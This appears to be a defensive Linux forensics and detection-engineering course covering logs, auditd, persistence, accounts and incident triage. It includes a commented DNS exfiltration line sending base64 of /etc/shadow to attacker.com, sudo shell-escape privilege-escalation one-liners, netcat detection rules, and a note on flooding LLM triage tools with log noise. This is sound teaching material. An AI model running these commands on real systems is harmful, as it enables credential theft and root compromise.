Concept 1 — The Linux File System Hierarchy

The Linux file system is a single tree rooted at /. Every file, device, and process is represented as a file somewhere in this tree. Knowing which directories hold what is essential for forensic investigation — if a malware dropper writes a file to /tmp or hides a binary in /usr/local/bin, you need to know that is unexpected.

Key directories for security analysis:

  • /etc — system-wide configuration (passwd, shadow, sudoers, cron jobs)
  • /var/log — log files (auth.log, syslog, audit/audit.log)
  • /tmp and /var/tmp — world-writable; a common attacker staging area
  • /proc — virtual filesystem exposing kernel and process state in real time
  • /home and /root — user home directories; .bashrc, .ssh/authorized_keys
  • /usr/bin, /usr/sbin — system binaries; unexpected new binaries here are a red flag
  • /dev/shm — shared memory; used by fileless malware to stage payloads in RAM

Data engineering analogy: the Linux file system hierarchy is like a data lake with well-defined zones. /etc is your configuration bucket (read-only for most consumers). /var/log is your logs bucket. /tmp is a scratch zone that should never contain long-lived data — if it does, something is wrong, just like finding a 3 GB CSV in your scratch prefix that has been there for 6 months.

Example:

# Interesting files for a threat hunter:
/etc/passwd           # all user accounts (no passwords — those are in /etc/shadow)
/etc/shadow           # hashed passwords — readable only by root
/etc/sudoers          # who can run commands as root
/etc/cron.d/          # scheduled tasks — persistence mechanism
/var/log/auth.log     # authentication events (Debian/Ubuntu)
/var/log/secure       # authentication events (RHEL/CentOS)
/var/log/audit/audit.log  # auditd events — most detailed Linux telemetry

# Find files modified in the last 24 hours in /usr/bin:
find /usr/bin -mtime -1 -type f
# Any result is suspicious — system binaries should not change day to day

Exercise: On a Linux VM or WSL instance, run:

find /etc -name "*.conf" -mtime -7 -type f 2>/dev/null

Then run:

find /tmp /var/tmp -type f 2>/dev/null

For each file found in /tmp, note its name, size, and modification time. Expected output: a list of files modified in /etc in the last week, and a list (possibly empty) of files in /tmp.

Concept 2 — Linux File Permissions and SUID/SGID

Linux permissions control who can read, write, or execute each file. Every file has three permission triplets: owner, group, and others. As a security analyst, the critical cases are:

  • World-writable files (-rw-rw-rw- or chmod 777) in sensitive directories
  • SUID bit (-rwsr-xr-x) — the file executes as the file's owner, not the caller. A SUID binary owned by root runs as root regardless of who runs it. Attackers exploit SUID binaries for privilege escalation.
  • SGID bit — same concept but for the group

Data engineering analogy: SUID is like a stored procedure that runs as the DBA user regardless of who calls it. If an attacker can manipulate a SUID binary, they escalate to root — the equivalent of a data analyst calling a stored proc that grants them table-owner privileges.

Example:

# Find all SUID binaries on the system:
find / -perm -4000 -type f 2>/dev/null

# Typical output (these are legitimate):
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount

# Suspicious output (unexpected SUID binary in a non-standard location):
/tmp/backdoor        # SUID binary in /tmp — immediate red flag
/home/user/.local/bin/shell  # SUID binary in user home dir — red flag

# Check permissions of a specific file:
ls -la /usr/bin/passwd
# -rwsr-xr-x 1 root root 68208 Jan 15 2024 /usr/bin/passwd
#    ^                                       (s = SUID bit set)

Exercise: Run the SUID find command above on your Linux system. For each result outside of /usr/bin, /usr/sbin, /bin, and /sbin, note the file path and owner. Then check GTFOBins (gtfobins.github.io) — it lists which SUID binaries can be abused for privilege escalation. Expected output: a list of SUID binaries with their paths, owners, and whether they appear on GTFOBins.

Concept 3 — /proc: The Live Process Filesystem

/proc is a virtual filesystem that the kernel populates in real time. Every running process has a directory /proc/<PID>/ containing:

  • cmdline — the full command line used to start the process
  • exe — a symlink to the actual binary on disk
  • maps — memory map (all loaded libraries and memory regions)
  • fd/ — all open file descriptors (files, sockets, pipes)
  • net/tcp — active TCP connections for this process

This is invaluable for live forensics: you can find a process running from a deleted file (exe symlink shows (deleted)), see what network connections a process has open, and inspect the full command line of any process.

Data engineering analogy: /proc is a live introspection API for the kernel — like a metrics endpoint that exposes the internal state of every running job in your pipeline. No agent needed; it is always there.

Example:

# Find processes running from deleted binaries (fileless execution indicator):
for pid in /proc/[0-9]*/exe; do
    target=$(readlink "$pid" 2>/dev/null)
    if [[ "$target" == *"(deleted)"* ]]; then
        echo "PID $(basename $(dirname $pid)): $target"
    fi
done

# Show all network connections for a specific process (PID 1234):
cat /proc/1234/net/tcp
# Or use ss / netstat:
ss -p | grep 1234

# See full command line of PID 1234:
cat /proc/1234/cmdline | tr '\0' ' '

Exercise: On your Linux system, pick any running process (e.g., your shell — find its PID with echo $$). Read the following for that PID:

  1. cat /proc/<PID>/cmdline | tr '\0' ' ' — what command started it?
  2. ls -la /proc/<PID>/fd/ — how many file descriptors does it have open?
  3. cat /proc/<PID>/status | grep VmRSS — how much physical RAM is it using?

Expected output: three lines showing command line, file descriptor count, and RSS memory for your chosen process.

Concept 1 — Linux Log Files and Log Sources

Linux writes logs to /var/log/. The most important log files for a detection engineer:

File Content
/var/log/auth.log (Debian) or /var/log/secure (RHEL) SSH logins, sudo usage, PAM authentication
/var/log/syslog or /var/log/messages General system events
/var/log/kern.log Kernel messages (driver load, kernel module events)
/var/log/audit/audit.log auditd events — the most detailed telemetry source
/var/log/wtmp / /var/log/btmp Login history / failed login history (binary format)
/var/log/lastlog Last login per user (binary format)
/var/log/cron Cron job execution
~/.bash_history Per-user command history (easily cleared — not reliable)

Data engineering analogy: /var/log/auth.log is your authentication events stream — like Okta or Azure AD Sign-In logs but for local Linux access. audit.log is your detailed audit trail — like BigQuery's data access audit logs at the OS level.

Example:

# Parse failed SSH logins from auth.log:
grep "Failed password" /var/log/auth.log | tail -20
# Output:
# Jan 15 09:23:41 server sshd[1234]: Failed password for root from 192.168.1.100 port 54321 ssh2
# Jan 15 09:23:43 server sshd[1234]: Failed password for root from 192.168.1.100 port 54322 ssh2

# Count failed attempts per source IP:
grep "Failed password" /var/log/auth.log \
  | awk '{print $(NF-3)}' \
  | sort | uniq -c | sort -rn | head -10

# Parse wtmp (binary login history) with Python:
import struct
# wtmp uses fixed-size records — use 'last' command instead:
# last -n 20

Exercise: On your Linux system, run:

grep "Failed password\|Accepted password\|Accepted publickey" /var/log/auth.log | tail -30

For each Accepted line: note the username, source IP, and authentication method. For each Failed line: note the username and source IP. If your auth.log is empty, use: journalctl -u sshd --since "1 hour ago" instead. Expected output: a list of recent SSH authentication events split into accepted and failed.

Concept 2 — auditd: The Linux Audit Daemon

auditd is the most powerful telemetry source on Linux. It can log every system call, file access, command execution, and network connection. You configure rules that specify what to monitor.

Data engineering analogy: auditd is like enabling full SQL query logging on your database — you see every statement executed, by which user, from which connection. By default it is off or minimal; you enable the rules that matter for your use case.

Key auditd rule syntax:

-a always,exit -F arch=b64 -S execve -k exec_commands
  • -a always,exit — always add a record on syscall exit
  • -F arch=b64 — filter: 64-bit processes only
  • -S execve — syscall: execve (any command execution)
  • -k exec_commands — tag this rule so you can grep for it

Critical auditd rule sets: the Linux Audit System project publishes recommended rules at github.com/bfuzzy1/auditd-attack — mapped directly to MITRE ATT&CK.

Example:

# /etc/audit/rules.d/security.rules — minimal detection ruleset

# Log all command executions:
-a always,exit -F arch=b64 -S execve -k exec_commands
-a always,exit -F arch=b32 -S execve -k exec_commands

# Log privilege escalation via sudo:
-w /usr/bin/sudo -p x -k sudo_usage

# Log changes to passwd and shadow:
-w /etc/passwd -p wa -k identity_change
-w /etc/shadow -p wa -k identity_change

# Log SSH authorized_keys modifications:
-w /root/.ssh/authorized_keys -p wa -k ssh_key_add
-w /home -p wa -k ssh_key_add

# Log cron job changes:
-w /etc/cron.d/ -p wa -k cron_modification
-w /var/spool/cron/ -p wa -k cron_modification

Exercise: Enable the auditd execve rule on your Linux system:

sudo auditctl -a always,exit -F arch=b64 -S execve -k my_test

Run a few commands (ls, whoami, id), then read the audit log:

sudo ausearch -k my_test | tail -20

Find the EXECVE record for your ls command. Note the argc (argument count) and a0 (the command name) fields. Expected output: one EXECVE audit record showing the command and arguments.

Concept 3 — Parsing auditd Logs with Python

auditd writes events in a multi-line format: one logical event spans several lines (TYPE=SYSCALL, TYPE=EXECVE, TYPE=CWD, TYPE=PATH), all linked by a timestamp and serial number. Parsing requires grouping lines by their serial number.

Data engineering analogy: auditd logs are like multi-line JSON split across rows — similar to parsing a multi-line log format in a Spark job where you need to group by a correlation ID before processing.

Example:

import re
from collections import defaultdict

def parse_audit_log(path: str) -> list[dict]:
    # Groups audit records by serial number (msg=audit(timestamp:serial))
    groups: dict[str, dict] = defaultdict(dict)
    order: list[str] = []

    with open(path, encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            # Extract type
            type_m = re.match(r"type=(\S+)", line)
            # Extract serial number from msg=audit(timestamp:serial)
            serial_m = re.search(r"msg=audit\([\d.]+:(\d+)\)", line)
            if not type_m or not serial_m:
                continue
            rec_type = type_m.group(1)
            serial   = serial_m.group(1)
            # Extract all key=value pairs
            fields = dict(re.findall(r'(\w+)=(?:"([^"]*?)"|(\S+))', line))
            if serial not in groups:
                order.append(serial)
            groups[serial][rec_type] = fields

    return [{"serial": s, **groups[s]} for s in order]

# Usage:
events = parse_audit_log("/var/log/audit/audit.log")
execve_events = [e for e in events if "EXECVE" in e]
print(execve_events[0])

Concept 1 — Network State Investigation: ss, netstat, and /proc/net


When investigating a compromised Linux host, one of the first questions is: "what network connections does this machine have, and which process owns each one?" The tools ss and netstat answer this, backed by /proc/net/tcp.


Data engineering analogy: querying network state is like running SHOW PROCESSLIST on a database — you get a real-time view of all active connections, their state, and which process is holding them. An unexpected connection to an external IP from a process that should have no network access is the equivalent of a pipeline worker connecting to an external API without any code authorizing it.


Example:


# Show all TCP connections with process information:
ss -tnp
# Output:
# State   Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process
# ESTAB   0      0      10.0.1.15:22        10.0.0.1:54321     users:(("sshd",pid=1234,fd=3))
# LISTEN  0      128    0.0.0.0:22          0.0.0.0:*          users:(("sshd",pid=999,fd=3))
# ESTAB   0      0      10.0.1.15:44231     52.86.1.1:443      users:(("curl",pid=2345,fd=5))

# Find all listening ports and the process that owns them:
ss -tlnp

# Suspicious: a process with no known reason to listen on a high port
# LISTEN  0      5      0.0.0.0:31337       0.0.0.0:*          users:(("bash",pid=6666,fd=4))
# bash listening on port 31337 = bind shell (attacker backdoor)

# Read raw TCP table from /proc (useful in scripts):
cat /proc/net/tcp  # hex-encoded — use Python's socket.inet_ntoa(struct.pack('<L', int(hex, 16)))

Concept 2 — Linux Persistence Mechanisms


Attackers establish persistence on Linux by ensuring their code runs automatically after reboot or on a schedule. The most common mechanisms:


    

  1. Cron jobs — crontab -e (user) or /etc/cron.d/ (system)
    2. 

  2. Systemd services — /etc/systemd/system/ — a service unit file that runs a binary
    3. 

  3. .bashrc / .bash_profile — code appended here runs every time a user opens a shell
    4. 

  4. SSH authorized_keys — attacker adds their public key to ~/.ssh/authorized_keys
    5. 

  5. SUID binary drop — attacker creates a SUID root shell
    6. 

  6. LD_PRELOAD hijack — environment variable that loads a library before all others; a malicious library can hook standard functions
    7. 



Data engineering analogy: Linux persistence is like injecting a rogue DAG into Airflow's DAG store. The job runs silently on schedule, and unless you are auditing the DAG list, you will not notice. ~/.bashrc hijacking is like inserting a custom Python import hook into sitecustomize.py — it runs before your code without being part of your code.


Example:


# Find all user crontabs:
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -u "$user" -l 2>/dev/null | grep -v "^#" | grep -v "^$" \
      | while read -r line; do echo "$user: $line"; done
done

# Find suspicious systemd service units (not from package manager):
find /etc/systemd/system/ /usr/lib/systemd/system/ -name "*.service" \
  -newer /usr/lib/systemd/system/ssh.service 2>/dev/null

# Check all .ssh/authorized_keys files:
find /home /root -name "authorized_keys" -type f 2>/dev/null \
  | xargs -I{} sh -c 'echo "=== {} ==="; cat {}'

# Detect LD_PRELOAD in /etc/ld.so.preload (global hijack):
cat /etc/ld.so.preload 2>/dev/null

Concept 3 — Linux Network Tools for Attackers (and Defenders)


Attackers use built-in Linux networking tools for reconnaissance and exfiltration. As a detection engineer, seeing these tools in auditd EXECVE events — especially from unusual parent processes or at unusual times — is a high-signal detection opportunity.


Example:


# Reconnaissance commands — appear in EXECVE audit events:
nmap, masscan          → port scanning (rarely legitimate on a server)
netstat, ss            → enumerating network state (normal for admins, suspicious for www-data)
arp, ip neigh          → ARP table enumeration (lateral movement prep)
curl, wget             → outbound downloads (watch for non-package-manager usage)
nc, ncat, socat        → netcat — can create bind/reverse shells
dig, nslookup, host    → DNS queries (used in DNS tunneling)

# Detection: alert when these run as unexpected users
# www-data (web server user) running nmap or nc is almost certainly an intrusion
# root running curl to a non-package-manager URL is suspicious

# Example auditd rule to catch netcat:
-w /usr/bin/nc -p x -k netcat_execution
-w /usr/bin/ncat -p x -k netcat_execution
-w /bin/nc -p x -k netcat_execution

# Exfiltration via DNS (detected by high query rate or long subdomain strings):
# dig $(cat /etc/shadow | base64 | head -c 60).attacker.com

Concept 1 — /etc/passwd, /etc/shadow, and Account Forensics


/etc/passwd lists all accounts on the system. Each line has seven colon-separated fields: username, password placeholder, UID, GID, GECOS (description), home directory, and shell. /etc/shadow stores the actual password hashes (readable by root only).


Forensic checks:


    

  • UIDs 0–99 are reserved for system accounts. A non-root user with UID=0 has root privileges.
    • 

  • A shell of /bin/bash for a service account is suspicious — service accounts should use /sbin/nologin or /bin/false.
    • 

  • Locked accounts have ! or * in the shadow password field.
    • 



Data engineering analogy: /etc/passwd is your IAM users table. /etc/shadow is your secrets table. A service account with an interactive shell is like a data pipeline service account that has been granted console login — a misconfiguration that dramatically expands the blast radius of a compromise.


Example:


# /etc/passwd format: username:x:UID:GID:description:homedir:shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  # correct — no shell
backup_agent:x:1001:1001::/home/backup_agent:/bin/bash  # suspicious — service account with shell

# Find all accounts with UID 0 (should only be root):
awk -F: '($3 == 0) {print $1}' /etc/passwd

# Find all accounts with interactive shells (excludes nologin/false):
grep -v "nologin\|/bin/false\|/bin/sync" /etc/passwd | awk -F: '{print $1, $7}'

# Find accounts with no password (empty hash in shadow):
sudo awk -F: '($2 == "" ) {print $1}' /etc/shadow

Concept 2 — sudo and Privilege Escalation Paths


sudo allows specific users to run commands as root (or another user) without knowing the root password. The sudoers file (/etc/sudoers and /etc/sudoers.d/) defines who can run what. Misconfigurations in sudoers are a common privilege escalation path.


Common misconfiguration patterns:


    

  • ALL=(ALL) NOPASSWD: ALL — run any command as root without a password (effectively root)
    • 

  • user ALL=(ALL) NOPASSWD: /usr/bin/vim — run vim as root without password → can use vim's shell escape (!bash)
    • 

  • user ALL=(ALL) NOPASSWD: /usr/bin/find → sudo find / -exec /bin/bash \; → root shell
    • 



GTFOBins (gtfobins.github.io) lists every Unix binary that can be abused when run via sudo.


Example:


# Check your own sudo permissions:
sudo -l
# Output:
# User bob may run the following commands on server:
#     (ALL) NOPASSWD: /usr/bin/vim    ← dangerous
#     (www-data) NOPASSWD: /usr/bin/python3  ← less dangerous but still risky

# Exploit: escalate to root via vim's shell escape
# sudo vim -c ':!id'
# uid=0(root) gid=0(root)

# Audit all sudoers entries:
sudo visudo -c  # check syntax only, no edit
cat /etc/sudoers | grep -v "^#\|^$"
ls /etc/sudoers.d/

Concept 3 — SSH Keys and Lateral Movement


SSH keys replace passwords for remote authentication. The server stores authorized public keys in ~/.ssh/authorized_keys. An attacker who adds their public key to this file can log in without a password at any time in the future — a stealthy persistence mechanism.


Lateral movement via SSH: after compromising one Linux host, an attacker looks for:


    

  1. Private keys in ~/.ssh/id_rsa (or id_ed25519) — these unlock other systems
    2. 

  2. SSH known_hosts files — which other hosts has this user connected to?
    3. 

  3. SSH config files — credentials stored for convenience
    4. 



Example:


# Find all authorized_keys files (persistence check):
find / -name "authorized_keys" -type f 2>/dev/null
# For each, compare with expected authorized keys

# Find private keys (look for PEM headers):
grep -r "BEGIN.*PRIVATE KEY" /home /root 2>/dev/null

# SSH known_hosts reveals lateral movement graph:
cat ~/.ssh/known_hosts
# Each entry = a host this machine has connected to
# Format: hostname,IP key_type public_key

# Detect recent SSH lateral movement in auth.log:
grep "Accepted publickey" /var/log/auth.log | grep -v "10.0.1." \
  | awk '{print $1, $2, $3, "from:", $11, "user:", $9}'

Concept 1 — Triage Commands: First 10 Minutes on a Compromised Host


When you land on a potentially compromised Linux host, you need to quickly gather volatile state (memory, processes, network connections) before doing anything that might alter the system or alert the attacker. This is a structured triage runbook.


Data engineering analogy: this is like the first triage steps when a production pipeline fails — you check the job status, memory usage, active queries, and logs before you start restarting services. You gather evidence first, act second.


Example:


# === Linux IR Triage Runbook (run as root) ===

# 1. Who is currently logged in?
w
last -n 20
who

# 2. What processes are running?
ps auxf                        # full process tree with forest view
ps -eo pid,ppid,user,cmd      # PID, PPID, user, command — useful for pivot table

# 3. What network connections exist?
ss -tnp                        # TCP connections with process
ss -unlp                       # UDP listeners
netstat -rn                    # routing table — is traffic being redirected?

# 4. What processes are listening for connections?
ss -tlnp | grep -v "127.0.0.1\|::1"   # external-facing listeners only

# 5. Are any processes running from deleted files?
ls -la /proc/*/exe 2>/dev/null | grep deleted

# 6. What scheduled tasks exist?
crontab -l
cat /etc/crontab
ls /etc/cron.d /etc/cron.daily /etc/cron.weekly

# 7. Recent file modifications in sensitive dirs:
find /tmp /var/tmp /dev/shm -newer /etc/passwd -type f 2>/dev/null
find /usr/bin /usr/sbin /bin /sbin -newer /etc/passwd -type f 2>/dev/null

# 8. Check loaded kernel modules (rootkits hide here):
lsmod | grep -v "^Module"

Concept 2 — Parsing Linux Logs with Python (Royal Road Foundation)


The W03 Royal Road artifact extends the W02 EVTX parser to support syslog and auditd formats, outputting a unified normalized schema that lets you JOIN Windows and Linux events by time and source IP.


Example:


import re
from datetime import datetime

# Syslog format: "Jan 15 09:23:41 hostname process[pid]: message"
SYSLOG_RE = re.compile(
    r"^(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})\s+(\S+)\s+(\S+?)(?:\[(\d+)\])?:\s+(.*)$"
)

def parse_syslog_line(line: str) -> dict | None:
    m = SYSLOG_RE.match(line.strip())
    if not m:
        return None
    ts_str, host, proc, pid, msg = m.groups()
    # Normalize to ISO 8601 (assume current year — syslog omits it)
    try:
        ts = datetime.strptime(ts_str, "%b %d %H:%M:%S").replace(
            year=datetime.now().year
        )
    except ValueError:
        ts = None
    return {
        "time":    ts.isoformat() if ts else ts_str,
        "host":    host,
        "process": proc,
        "pid":     pid,
        "message": msg,
        "source":  "syslog",
    }

# Unified schema for BOTH Windows (W02) and Linux (W03):
# {"time": ISO8601, "host": str, "event_id"/"process": str,
#  "message": str, "source": "evtx"|"syslog"|"auditd", ...extra fields}

Concept 3 — Unified Log Schema: Joining Windows and Linux Events


The power of the Royal Road pipeline becomes clear when you can query Windows and Linux events side by side. A detection that spans both (e.g., "SMB lateral movement from Windows workstation immediately followed by suspicious SSH from the same IP to a Linux server") requires a shared schema.


Example:


import json
import pandas as pd
from pathlib import Path

def load_unified_pipeline(evtx_jsonl: str, syslog_jsonl: str) -> pd.DataFrame:
    rows = []
    for path in [evtx_jsonl, syslog_jsonl]:
        with open(path) as f:
            for line in f:
                rows.append(json.loads(line))
    df = pd.DataFrame(rows)
    df["time"] = pd.to_datetime(df["time"], errors="coerce", utc=True)
    return df.sort_values("time")

# Cross-platform detection: same IP appears in Windows 4625 (failed logon)
# AND Linux Failed password within 5 minutes
def detect_cross_platform_spray(df: pd.DataFrame) -> pd.DataFrame:
    win_failed = df[df.get("event_id", pd.Series()) == "4625"]
    lin_failed = df[df["message"].str.contains("Failed password", na=False)]

    results = []
    for _, row in win_failed.iterrows():
        ip = row.get("IpAddress", "")
        if not ip:
            continue
        window_end   = row["time"] + pd.Timedelta(minutes=5)
        matching_lin = lin_failed[
            lin_failed["message"].str.contains(ip, na=False) &
            (lin_failed["time"] >= row["time"]) &
            (lin_failed["time"] <= window_end)
        ]
        if not matching_lin.empty:
            results.append({"src_ip": ip, "win_time": row["time"],
                            "lin_events": len(matching_lin)})
    return pd.DataFrame(results)

LLM Integration


Topic: LLMs for cross-platform log correlation
Threat: An attacker deliberately generates high volumes of benign log noise on both Windows and Linux systems to overwhelm LLM-based triage tools with false positive candidates, causing alert fatigue and hiding the real attack sequence.
Opportunity: Feed a time-ordered sequence of cross-platform events for a specific IP address to an LLM and ask it to reconstruct the attacker's actions as a narrative. The LLM can identify the attack chain across Windows and Linux events that individual rule-based detections would miss.
Prompt to try: "Here is a time-ordered sequence of Windows and Linux log events from the same source IP 10.0.2.99 over a 10-minute window: [paste events]. Reconstruct what the attacker was doing step by step. Identify the technique (MITRE ATT&CK TTP) for each action."
